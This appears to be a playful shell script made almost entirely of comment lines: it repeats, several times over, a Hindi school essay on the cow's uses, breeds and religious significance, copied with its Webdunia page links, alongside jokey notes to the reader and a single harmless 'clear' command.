#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा




#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा





#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#यदि समझ आ गया तो अब सो जाओ






clear
























































#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो











#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
